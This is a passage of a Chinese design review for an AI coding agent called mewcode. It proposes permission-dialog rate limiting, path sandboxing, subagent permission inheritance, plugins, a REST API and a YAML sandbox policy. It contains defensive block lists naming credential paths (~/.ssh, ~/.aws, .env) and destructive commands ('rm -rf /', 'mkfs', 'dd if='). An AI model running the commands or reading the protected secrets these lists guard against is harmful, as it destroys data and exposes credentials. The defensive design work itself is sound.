            if self._are_similar(existing, request):
                # 合并到已有请求中
                existing.add_co_request(request)
                return None  # 不产生新的对话框
        
        if len(self.pending) >= self.max_per_turn:
            # 超过速率限制 → 自动拒绝
            request.future.set_result(Decision(effect="deny", 
                reason="Rate limited: too many permission requests in this turn"))
            return None
        
        self.pending.append(request)
        return request  # 需要新对话框
    
    def _are_similar(self, a: PermissionRequest, b: PermissionRequest) -> bool:
        """相同工具 + 相似参数 = 合并"""
        return (a.tool_name == b.tool_name 
                and self._arg_similarity(a.args, b.args) > 0.8)

class Agent:
    def __init__(self, ...):
        self.permission_coalescer = PermissionCoalescer(max_per_turn=5)
    
    async def _execute_tool(self, tool, params):
        decision = self.permission_checker.check(tool, params)
        if decision.effect == "ask":
            request = PermissionRequest(tool_name=tool.name, args=params)
            coalesced = self.permission_coalescer.add(request)
            if coalesced is None:
                return  # 已合并到已有请求
            # 产生一个对话框，带有 "Apply to all N similar" 选项
            yield coalesced
```

**改进效果**:
- ✅ 正常操作下每轮最多 1 个权限对话框
- ✅ Agent 无法通过大量请求轰炸用户（速率限制兜底）
- ✅ 用户体验从"频繁被打断"变为"批处理审批"

---

### P1-6: PathSandbox 纵深防御

**涉及文件**:
- `mewcode/permissions/sandbox.py` — 当前仅路径白名单（61 行）
- `mewcode/permissions/checker.py` — 沙箱检查仅对 `read/write` 工具生效
- `mewcode/tools/bash.py` — 需要新增路径检查

**现状问题**:

1. **Bash 工具不走路径沙箱**：`checker.py` 第 65 行，`category in ("read", "write")` 不包含 `"command"`，所以 Bash 可以访问任意路径
2. **符号链接逃逸**：`PathSandbox.check()` 使用 `resolve(strict=True)` 解析符号链接，但攻击者创建 `safe_link -> /etc/passwd` 时可能未被正确拦截
3. **敏感路径无保护**：`~/.ssh`、`~/.aws`、`/proc`、`/sys`、`.git/config` 等可被读写工具直接访问

**改进方案**:

```python
# sandbox.py 修改
class PathSandbox:
    # 敏感路径黑名单
    SENSITIVE_PATHS = [
        "~/.ssh/*", "~/.aws/*", "~/.gcloud/*",
        "/proc/*", "/sys/*", "/dev/*",
        "**/.git/config", "**/.env", "**/credentials*",
    ]
    
    def check(self, path: str) -> tuple[bool, str]:
        p = Path(path).expanduser()
        real_path = os.path.realpath(str(p))  # 彻底解析所有符号链接
        
        # Layer 1: 敏感路径黑名单
        for pattern in self.SENSITIVE_PATHS:
            if fnmatch.fnmatch(str(real_path), pattern):
                # 排除白名单中的安全路径
                if not self._is_safe_sensitive_path(real_path):
                    return False, f"Path {path} resolves to protected location"
        
        # Layer 2: 白名单检查（现有逻辑）
        for root in self._allowed_roots:
            try:
                Path(real_path).relative_to(root)
                return True, ""
            except ValueError:
                continue
        
        return False, f"Path {path} is outside sandbox"
```

在 Bash 工具中集成路径检查：

```python
# bash.py 修改
async def execute(self, params: BashParams) -> ToolResult:
    # 提取命令中的所有文件路径
    file_paths = self._extract_file_paths(params.command)
    for fp in file_paths:
        ok, reason = self.path_sandbox.check(fp)
        if not ok:
            return ToolResult(output=f"Sandbox rejected: {reason}", is_error=True)
    # 继续执行
```

**改进效果**:
- ✅ Bash 命令也被路径沙箱约束
- ✅ 敏感路径（密钥、凭证、系统文件）受保护
- ✅ 符号链接逃逸彻底被阻断（`os.path.realpath` 比 `resolve()` 更彻底）

---

### P1-7: Fork 权限状态继承

**涉及文件**:
- `mewcode/agents/fork.py` — `build_forked_messages()` 不传播权限状态
- `mewcode/tools/agent_tool.py` — Fork 路径创建全新 `PermissionChecker`

**现状问题**:

当一个 Agent Fork 出子代理时，`build_forked_messages()` 只深拷贝了对话历史，但没有传递父 Agent 的权限状态。子代理获得全新的 `PermissionChecker`——这意味着：
- 父 Agent 已批准的操作（"always allow" 规则）在子代理中全部丢失
- 子代理重新弹出父代理已经回答过"允许"的权限对话框
- 用户体验割裂

**改进方案**:

```python
# agents/fork.py 修改
@dataclass
class PermissionSnapshot:
    """父 Agent 的权限状态快照"""
    local_allow_rules: list[Rule]        # "always allow" 规则
    session_deny_patterns: set[str]      # "不再询问" 模式
    permission_mode: PermissionMode

def build_forked_messages(
    conversation: ConversationManager,
    permission_snapshot: PermissionSnapshot | None = None,  # 新增参数
) -> list[Message]:
    messages = deepcopy(conversation.history)
    
    if permission_snapshot and permission_snapshot.local_allow_rules:
        # 将父Agent的权限规则注入为系统提醒
        rules_text = "\n".join(
            f"- {r.tool_pattern}: {r.effect}" 
            for r in permission_snapshot.local_allow_rules
        )
        fork_notice = (
            "The following operations were already approved "
            f"in the parent session:\n{rules_text}\n"
            "You do NOT need to re-ask for permission on these."
        )
        messages.append(Message(role="user", content=fork_notice))
    
    return messages

# agent_tool.py 修改
class AgentTool(Tool):
    async def execute(self, params):
        if params.isolation != "worktree":
            # 快照父Agent的权限状态
            snapshot = PermissionSnapshot(
                local_allow_rules=self.parent_checker.rule_engine.local_rules,
                permission_mode=self.parent_checker.mode,
            )
            forked_msgs = build_forked_messages(
                self.parent_conversation, 
                permission_snapshot=snapshot,  # 传入快照
            )
```

**改进效果**:
- ✅ 子代理不再重复询问父代理已批准的权限
- ✅ 权限决策在 Agent 树中一致传播
- ✅ 用户不会感到"我之前明明说了允许"

---

## 5. P2 — 用户体验层

> 改善开发者体验、代码可读性和日常使用的流畅度。

---

### P2-1: 国际化——统一为英文代码库

**涉及文件**: 约 30+ 个 `.py` 文件

**现状问题**:

代码库混合使用中文和英文：
- 文件头有中文广告注释（`# 来源：公众号@小林coding`）
- 错误消息用中文（`f"路径 {path} 超出沙箱范围"` — `sandbox.py` 第 60 行）
- 变量名和注释部分中文、部分英文
- 权限规则文件中文/英文混合

这导致：
1. 国际贡献者无法参与（看不懂中文错误消息）
2. 在某些终端中出现编码问题
3. grep/搜索时中英文切换成本高

**改进方案**:

分两阶段实施：

Phase 1 — 统一为英文：
- 替换所有中文注释为英文
- 替换所有中文错误消息为英文
- 移除文件头的广告注释，替换为简洁的文件 docstring
- 权限规则文件统一使用英文标签

Phase 2 — 可选国际化支持（远期）：
- 提取用户可见字符串到消息目录
- 支持 `gettext` 风格的延迟本地化
- 默认语言为英文

```python
# sandbox.py 修改前
return False, f"路径 {path} 超出沙箱范围"

# sandbox.py 修改后
return False, f"Path {path} is outside the sandbox"
```

**改进效果**:
- ✅ 代码库对国际贡献者可访问
- ✅ 日志和错误消息在英文终端中正常显示
- ✅ grepping 和搜索不再切换中英文输入法

---

### P2-2: 语义化工具搜索

**涉及文件**:
- `mewcode/tools/__init__.py` — `ToolRegistry.search_deferred()`（第 59-96 行）
- `mewcode/tools/impl/tool_search.py` — `ToolSearchTool`

**现状问题**:

当前 `search_deferred()` 使用**字符串子串匹配**（`score += 10` for name match, `score += 5` for description match）。查询 `"how do I run a shell command"` 不会匹配到 `Bash` 工具，因为 `"bash" != "shell"`。

**改进方案**:

利用 P1-1 中建立的本地嵌入引擎：

```python
# tools/__init__.py 修改
class ToolRegistry:
    def __init__(self):
        self._tool_embeddings: dict[str, np.ndarray] = {}
        self._embedder = None  # lazy init
    
    def register(self, tool: Tool):
        self._tools[tool.name] = tool
        # 注册时计算嵌入向量
        if self._embedder:
            text = f"{tool.name}: {tool.description}"
            self._tool_embeddings[tool.name] = self._embedder.encode(text)
    
    def search_deferred(self, query: str, top_k: int = 10) -> list[tuple[str, float]]:
        if self._embedder:
            # 语义搜索路径
            q_vec = self._embedder.encode(query)
            scores = {
                name: cosine_similarity(q_vec, vec)
                for name, vec in self._tool_embeddings.items()
            }
            return sorted(scores.items(), key=lambda x: -x[1])[:top_k]
        else:
            # 降级到关键词匹配
            return self._keyword_search(query, top_k)
```

**改进效果**:
- ✅ `"run shell command"` → 找到 `Bash`
- ✅ `"send message to teammate"` → 找到 `SendMessage`
- ✅ `"create a new worktree"` → 找到 `EnterWorktree`
- ✅ 自然语言查询精确匹配目标工具

---

### P2-3: TUI 流式工具输出渲染

**涉及文件**:
- `mewcode/app.py` — TUI 渲染层（约 1920 行）

**现状问题**:

当前 TUI 中，工具执行期间显示静态的 "tool executing..." 块，完成后一次性显示全部输出。对于 `npm install` 或 `pytest` 这种运行 30-120 秒的命令，用户面对的是一个卡住的界面。

**Claude Code 标准**:

工具输出**逐行实时显示**在终端中，带有 spinner 动画和已用时间。

**改进方案**:

依赖 P0-1 的流式工具输出基础，在 TUI 层新增 `LiveToolBlock` 控件：

```python
# app.py 新增
class LiveToolBlock(Widget):
    """实时更新的工具输出块"""
    
    def __init__(self, tool_name: str):
        self.tool_name = tool_name
        self.output_lines: list[str] = []
        self.start_time = time.time()
        self.spinner = SpinnerAnimation()
    
    def on_tool_output_chunk(self, event: ToolOutputChunk):
        """逐行追加输出"""
        self.output_lines.append(event.text)
        self.refresh(layout=True)
    
    def on_tool_complete(self, event: ToolResultEvent):
        """完成后折叠为最终结果块"""
        self.spinner.stop()
        elapsed = time.time() - self.start_time
        self.render(f"[{self.tool_name}] completed in {elapsed:.1f}s")
        if event.exit_code != 0:
            self.render(f"Exit code: {event.exit_code}")

# agent.run() 事件消费
async for event in agent.run(conversation):
    if isinstance(event, ToolOutputChunk):
        live_block.on_tool_output_chunk(event)
    elif isinstance(event, ToolResultEvent):
        live_block.on_tool_complete(event)
```

**改进效果**:
- ✅ 长时间命令实时可见进度
- ✅ 用户可以在命令运行中判断是否正常
- ✅ 完成后显示耗时和退出码
- ✅ 匹配 Claude Code 的终端体验

---

### P2-4: 结构化工具输出

**涉及文件**:
- `mewcode/tools/base.py` — `ToolResult` 数据类（当前仅 `output: str` + `is_error: bool`）
- 各工具实现：`glob.py`、`grep.py`、`bash.py` 等

**现状问题**:

`ToolResult` 只有纯文本输出。当 `Glob` 找到 500 个文件时，Agent 得到的是 500 行文本——必须自己解析。当 `Grep` 找到匹配行时，Agent 需要从文本中正则提取文件名和行号。这浪费 token 并导致解析错误。

**Claude Code 标准**:

工具提供结构化输出（JSON），Agent 可以编程式访问结果而非解析文本。

**改进方案**:

```python
# base.py 修改
@dataclass
class ToolResult:
    output: str
    is_error: bool = False
    structured_output: dict[str, Any] | None = None  # 新增
    
# glob.py 修改
async def execute(self, params: GlobParams) -> ToolResult:
    files = list(Path(params.path).rglob(params.pattern))
    return ToolResult(
        output="\n".join(str(f) for f in files),
        structured_output={
            "files": [str(f) for f in files],
            "count": len(files),
            "total_size": sum(f.stat().st_size for f in files if f.is_file()),
        }
    )

# grep.py 修改
async def execute(self, params: GrepParams) -> ToolResult:
    matches = []
    for file_path, line_no, content in self._grep(params):
        matches.append({"file": str(file_path), "line": line_no, "content": content})
    return ToolResult(
        output=self._format_text(matches),
        structured_output={"matches": matches, "count": len(matches)},
    )
```

Agent 系统提示中说明：

```
When a tool returns structured_output, prefer it over parsing the text output.
Example: result.structured_output["count"] instead of counting lines.
```

**改进效果**:
- ✅ Agent 通过 `result.structured_output["count"] == 0` 直接判断，而非正则解析
- ✅ 减少解析错误导致的后续纠错轮次
- ✅ 节省 token（不需要 Agent 重新分析工具输出文本）

---

### P2-5: 优雅降级——错误恢复策略

**涉及文件**:
- `mewcode/agent.py` — `consecutive_unknown >= 3` 直接终止（第 761 行）
- `mewcode/agent.py` — 压缩错误循环重试（第 495 行）

**现状问题**:

当 Agent 连续 3 次调用未知工具或 API 超时时，循环**直接终止**——用户丢失所有进度。没有尝试以下操作：
- 清除上下文重试
- 切换到更强模型
- 注入"你的上次调用失败了"的提示引导

**改进方案**:

```python
# agent.py 新增
class ErrorRecoveryStrategy(Enum):
    CLARIFY = "clarify"     # 注入错误说明，要求重试
    STRIP_CONTEXT = "strip" # 压缩上下文后重试
    ESCALATE_MODEL = "escalate"  # 升级到更强模型
    TERMINATE = "terminate" # 当前行为：直接终止

class ErrorRecoveryManager:
    """错误恢复状态机"""
    
    def __init__(self):
        self.error_count: dict[str, int] = {}  # error_type -> count
        self.strategy_chain = [
            ErrorRecoveryStrategy.CLARIFY,
            ErrorRecoveryStrategy.STRIP_CONTEXT,
            ErrorRecoveryStrategy.ESCALATE_MODEL,
            ErrorRecoveryStrategy.TERMINATE,
        ]
    
    def next_strategy(self, error_type: str) -> ErrorRecoveryStrategy:
        idx = min(self.error_count.get(error_type, 0), len(self.strategy_chain) - 1)
        self.error_count[error_type] = idx + 1
        return self.strategy_chain[idx]
    
    def apply(self, strategy: ErrorRecoveryStrategy, agent: Agent, conversation):
        match strategy:
            case ErrorRecoveryStrategy.CLARIFY:
                conversation.add_system_reminder(
                    "The previous tool call failed. Please try a different approach."
                )
            case ErrorRecoveryStrategy.STRIP_CONTEXT:
                agent.manual_compact(conversation)
            case ErrorRecoveryStrategy.ESCALATE_MODEL:
                agent.client = agent.model_router.escalate()
            case ErrorRecoveryStrategy.TERMINATE:
                raise AgentTerminatedError()
```

**改进效果**:
- ✅ Agent 存活率大幅提升——不再因为瞬态错误直接终止
- ✅ 自动降级链条确保用户不丢失进度
- ✅ 错误类型追踪 → 针对性恢复策略

---

## 6. P3 — 面向未来演进

> 这些是**远期架构投资**——为项目的长期发展和生态系统做准备。

---

### P3-1: Python 插件系统

**涉及文件**:
- 新建 `mewcode/plugins/` 包
- 修改 `mewcode/skills/loader.py`、`mewcode/agents/loader.py`

**现状问题**:

当前扩展方式仅限于基于文件的加载——技能从 `.md` 文件、代理从 `.md` 文件。无法通过 pip install 分发包含自定义工具、Hook 执行器、沙箱后端的 Python 包。

**Claude Code 标准**:

Hook 系统是主要扩展机制，支持通过配置注册外部命令和脚本。

**改进方案**:

```python
# plugins/base.py (新增)
class MewcodePlugin(ABC):
    """插件基类"""
    name: str
    version: str
    
    def register_tools(self, registry: ToolRegistry): ...
    def register_hook_actions(self, engine: HookEngine): ...
    def register_sandbox_backends(self, manager: SandboxManager): ...
    def register_commands(self, registry: CommandRegistry): ...

# pyproject.toml (第三方包)
[project.entry-points."mewcode.plugins"]
my_plugin = "my_package.plugin:MyPlugin"

# plugins/manager.py (新增)
class PluginManager:
    def load_all(self):
        for ep in importlib.metadata.entry_points(group="mewcode.plugins"):
            plugin_cls = ep.load()
            plugin = plugin_cls()
            plugin.register_tools(self.tool_registry)
            plugin.register_hook_actions(self.hook_engine)
            # ...
```

**改进效果**:
- ✅ 第三方可以通过 pip install 分发 mewcode 扩展
- ✅ 插件生态系统可以独立于核心代码发展
- ✅ 保持文件加载作为简单路径，插件作为高级路径

---

### P3-2: HEADLESS REST API 模式

**涉及文件**:
- 新建 `mewcode/api/` 包
- 修改 `mewcode/__main__.py` — 增加 `--server` 标志

**现状问题**:

当前只有 TUI 模式。无法将 mewcode 作为 Web IDE 后端、CI/CD 管道中的 Agent、或自定义前端背后的引擎使用。

但好消息是：`Agent.run()` 已经返回 `AsyncIterator[AgentEvent]`——这天然就是一个 API 边界。

**改进方案**:

```python
# api/server.py (新增)
from fastapi import FastAPI
from sse_starlette import EventSourceResponse

app = FastAPI()

@app.post("/sessions")
async def create_session():
    session_id = str(uuid4())
    # 创建 Agent + ConversationManager
    sessions[session_id] = AgentSession(...)
    return {"session_id": session_id}

@app.post("/sessions/{session_id}/messages")
async def send_message(session_id: str, msg: MessageRequest):
    session = sessions[session_id]
    session.conversation.add_user_message(msg.content)
    
    async def event_stream():
        async for event in session.agent.run(session.conversation):
            yield {"event": event.type, "data": event.to_json()}
    
    return EventSourceResponse(event_stream())
```

CLI 入口：

```python
# __main__.py
parser.add_argument("--server", action="store_true")
# ...
if args.server:
    import uvicorn
    uvicorn.run("mewcode.api.server:app", port=8765)
```

**改进效果**:
- ✅ Web IDE 集成（VS Code 插件可直接调用 mewcode API）
- ✅ CI/CD 管道 Agent（GitHub Actions 中运行 mewcode Agent）
- ✅ 自定义前端（浏览器版 mewcode UI）
- ✅ Agent 循环和 UI 层已经是分离的——这是最低成本的新模式

---

### P3-3: 结构化可观测性管道

**涉及文件**:
- `mewcode/agents/trace.py` — 当前 `TraceManager` 仅记录调用树
- `mewcode/agent.py` — Agent 循环中散布的 `logger.info()` 调用

**现状问题**:

当前日志使用标准 `logging` 模块的 f-string 风格，无可观测性基础设施。没有：
- 结构化的 JSON 日志
- 指标导出（轮次延迟、工具执行时间分布、缓存命中率）
- 分布式追踪（跨 Agent 树传播 trace_id）

**改进方案**:

```python
# observability/metrics.py (新增)
import structlog
from opentelemetry import metrics, trace

logger = structlog.get_logger()
tracer = trace.get_tracer(__name__)

# Agent 循环中
@tracer.start_as_current_span("agent.turn")
async def _run_turn(self, conversation):
    turn_start = time.monotonic()
    try:
        async for event in self._step(conversation):
            yield event
    finally:
        duration = time.monotonic() - turn_start
        TURN_DURATION_HISTOGRAM.record(duration, {"agent_id": self.agent_id})
        logger.info("agent.turn.complete", 
                     duration_ms=duration*1000,
                     turn=self.iteration,
                     tokens_used=self.last_usage.total_tokens)
```

导出方式：
- 默认：本地 JSONL 文件，零依赖
- 可选：OLTP 导出到 Jaeger/Prometheus/Grafana

**改进效果**:
- ✅ 生产环境下可监控 Agent 性能
- ✅ 成本归因（哪个 Agent 消耗最多 token？）
- ✅ 延迟调试（哪个工具最慢？）
- ✅ 跨 Agent 树的分布式追踪

---

### P3-4: 配置驱动的沙箱策略框架

**涉及文件**:
- `mewcode/permissions/` — sandbox.py, dangerous.py, checker.py, rules.py
- `mewcode/validator.py` — 配置验证

**现状问题**:

沙箱策略分散在多个地方：`PathSandbox` 有固定白名单、`DangerousCommandDetector` 有固定黑名单、`RuleEngine` 有文件规则。没有统一的策略语言。添加新限制（如"在 Plan 模式下禁止网络访问"）需要改代码。

**改进方案**:

```yaml
# sandbox-policy.yaml
filesystem:
  allowed_roots: ["$PROJECT_ROOT", "/tmp"]
  denied_paths: ["~/.ssh/*", "~/.aws/*", "/proc/*", "/sys/*"]
  require_exist_ok: true

network:
  allow_outbound: true
  allowed_hosts: ["github.com", "pypi.org", "registry.npmjs.org"]
  deny_onion: true

process:
  max_memory_mb: 512
  max_cpu_seconds: 300
  allow_fork: false

commands:
  allowlist: ["git", "npm", "pip", "python", "pytest"]
  denylist_patterns: ["rm -rf /", "mkfs", "dd if=", "> /dev/sd"]

modes:
  plan:
    network:
      allow_outbound: false  # Plan 模式下更严格
    commands:
      allowlist: ["git", "ls", "cat", "grep", "find", "wc"]
```

```python
# permissions/policy.py (新增)
@dataclass
class SandboxPolicy:
    filesystem: FilesystemPolicy
    network: NetworkPolicy
    process: ProcessPolicy
    commands: CommandPolicy
    
    @classmethod
    def load(cls, path: Path) -> "SandboxPolicy":
        raw = yaml.safe_load(path.read_text())
        return cls(**raw)
    
    def evaluate(self, action: Action) -> PolicyDecision:
        # 统一评估所有策略维度
        ...
```

**改进效果**:
- ✅ 安全策略可审计、可版本控制、可在团队间共享
- ✅ 新增限制不需要改代码，只需修改 YAML
- ✅ Plan 模式的额外限制自然表达在策略文件中

---

### P3-5: FileHistory 快照轮转配置化

**涉及文件**:
- `mewcode/filehistory/history.py` — 第 15 行 `MAX_SNAPSHOTS = 100` 硬编码
- `mewcode/config.py` — 增加 `FileHistoryConfig`

**现状问题**:

`MAX_SNAPSHOTS = 100` 硬编码在源码中。对于频繁编辑的会话，100 个快照可能只代表 10 分钟的工作；对于持续几天的会话，100 个快照可能占用大量磁盘。且当前清理策略是朴素 FIFO——直接截断。

**改进方案**:

配置化：

```yaml
# config.yaml
fileHistory:
  maxSnapshots: 200       # 可配置
  strategy: "stratified"  # fifo | stratified
```

分层保留策略：

```python
# filehistory/history.py 修改
def _prune_snapshots(self, snapshots: list[Snapshot], max_count: int, strategy: str):
    if strategy == "fifo":
        return snapshots[-max_count:]
    elif strategy == "stratified":
        # 最近10个：全部保留
        # 中部：每10个保留1个
        # 尾部：每50个保留1个
        recent = snapshots[-10:]
        middle = snapshots[-max_count:-10:10]
        tail = snapshots[:-max_count:50]
        return list(tail) + list(middle) + list(recent)
```

**改进效果**:
- ✅ 磁盘使用量可调
- ✅ 分层策略保留更多"里程碑"快照（会话早期的关键状态）
- ✅ 更好的恢复点分布

---

## 7. 实施优先级路线图

```
Phase 1 (基础加固)            Phase 2 (质量提升)            Phase 3 (体验优化)
═══════════════════           ═══════════════════           ═══════════════════
Week 1-2:                     Week 3-4:                     Week 5-6:
┌─────────────────┐          ┌─────────────────┐          ┌─────────────────┐
│ P0-1 流式工具输出 │    →    │ P1-1 向量记忆    │    →    │ P2-1 国际化      │
│ P0-2 Bash沙箱加固 │         │ P1-3 多提供商缓存 │         │ P2-2 语义工具搜索 │
│ P0-5 AgentTool拆分│         │ P1-4 会话恢复加固 │         │ P2-3 TUI流式渲染  │
└─────────────────┘          │ P1-5 HITL速率限制 │         │ P2-4 结构化输出   │
                             │ P1-6 PathSandbox  │         │ P2-5 优雅降级     │
Phase 1 关键路径：            │ P1-7 Fork权限继承  │         └─────────────────┘
P0-1→P0-5（AgentTool拆分     └─────────────────┘
依赖流式接口）                                                Phase 4 (演进)
P0-1→P2-3（TUI渲染依赖       P1 项目之间独立，               ═══════════════════
流式基础）                    可并行实施                       Week 7+:
                                                             ┌─────────────────┐
                                                             │ P3-1 插件系统    │
                                                             │ P3-2 REST API    │
                                                             │ P3-3 可观测性    │
                                                             │ P3-4 沙箱策略    │
                                                             │ P3-5 快照轮转    │
                                                             └─────────────────┘
```

### 依赖关系

```
P0-1 (流式输出) ──────→ P2-3 (TUI流式渲染)
     │
     └──→ P0-5 (AgentTool拆分—executor流式接口)

P0-2 (Bash沙箱) ──────→ P1-6 (PathSandbox纵深防御)
     │                        │
     └──→ P3-4 (沙箱策略框架) ←┘

P1-1 (向量记忆) ──────→ P2-2 (语义工具搜索)
     │
     └──→ 共享嵌入引擎

P3-2 (REST API) ──────→ 依赖 Agent.run() 已返回 AsyncIterator
                         (当前已是，无需前置改动)
```

---

## 8. 附录：关键文件索引

### 核心模块文件

| 文件 | 行数 | 职责 | 涉及改进项 |
|------|------|------|-----------|
| `mewcode/agent.py` | 1256 | Agent 主循环 | P0-1, P0-3, P1-5, P2-5 |
| `mewcode/app.py` | 1920 | Textual TUI 应用 | P2-3 |
| `mewcode/client.py` | 606 | LLM 客户端抽象 | P0-4, P1-3 |
| `mewcode/conversation.py` | 201 | 对话管理 | P0-3 |
| `mewcode/config.py` | 255 | 配置加载 | P0-4, P3-4, P3-5 |
| `mewcode/validator.py` | 246 | 配置验证 | P0-4 |
| `mewcode/prompts.py` | 312 | 系统提示构建 | P2-4 |
| `mewcode/serialization.py` | 133 | 消息序列化 | P1-3 |

### 工具系统文件

| 文件 | 行数 | 职责 | 涉及改进项 |
|------|------|------|-----------|
| `mewcode/tools/base.py` | ~100 | Tool ABC | P0-1, P2-4 |
| `mewcode/tools/bash.py` | ~55 | Bash 命令执行 | P0-2, P1-6 |
| `mewcode/tools/agent_tool.py` | 665 | 子代理生成 | P0-5, P1-7 |
| `mewcode/tools/__init__.py` | ~200 | ToolRegistry | P2-2 |

### 安全与权限文件

| 文件 | 行数 | 职责 | 涉及改进项 |
|------|------|------|-----------|
| `mewcode/permissions/sandbox.py` | 61 | 路径沙箱 | P0-2, P1-6, P3-4 |
| `mewcode/permissions/dangerous.py` | ~50 | 危险命令检测 | P0-2, P3-4 |
| `mewcode/permissions/checker.py` | 101 | 权限决策引擎 | P0-2, P1-6 |
| `mewcode/permissions/rules.py` | ~120 | 规则引擎 | P3-4 |

### 上下文与记忆文件

| 文件 | 行数 | 职责 | 涉及改进项 |
|------|------|------|-----------|
| `mewcode/context/manager.py` | 854 | 上下文压缩 | P0-3, P1-4 |
| `mewcode/memory/auto_memory.py` | 241 | 记忆管理 | P1-1 |
| `mewcode/memory/recall.py` | ~80 | 记忆召回 | P1-1 |
| `mewcode/memory/session.py` | ~200 | 会话持久化 | P1-4 |

### 团队与通信文件

| 文件 | 行数 | 职责 | 涉及改进项 |
|------|------|------|-----------|
| `mewcode/teams/mailbox.py` | 130 | 团队邮箱 | P1-2 |
| `mewcode/agents/fork.py` | ~86 | Fork 逻辑 | P1-7 |

### 新建文件

| 文件 | 职责 | 对应改进项 |
|------|------|-----------|
| `mewcode/sandbox/executor.py` | 沙箱执行器抽象 | P0-2 |
| `mewcode/sandbox/subprocess.py` | 子进程沙箱 | P0-2 |
| `mewcode/sandbox/docker.py` | Docker 沙箱 | P0-2 |
| `mewcode/routing/router.py` | 模型路由器 | P0-4 |
| `mewcode/tools/executors/` | 拆分的 Agent 执行器 | P0-5 |
| `mewcode/memory/embeddings.py` | 嵌入向量存储 | P1-1 |
| `mewcode/teams/protocol.py` | A2A 协议定义 | P1-2 |
| `mewcode/teams/transports/` | A2A 传输层 | P1-2 |
| `mewcode/plugins/` | 插件系统 | P3-1 |
| `mewcode/api/server.py` | REST API 服务 | P3-2 |
| `mewcode/observability/` | 可观测性管道 | P3-3 |
| `mewcode/permissions/policy.py` | 沙箱策略框架 | P3-4 |

---

> **文档版本**: v1.0  
> **审计基准**: Claude Code 设计标准  
> **下一步**: 按 Phase 1 → Phase 2 → Phase 3 → Phase 4 顺序实施，每个改进项完成后更新本文档的"实施状态"列。
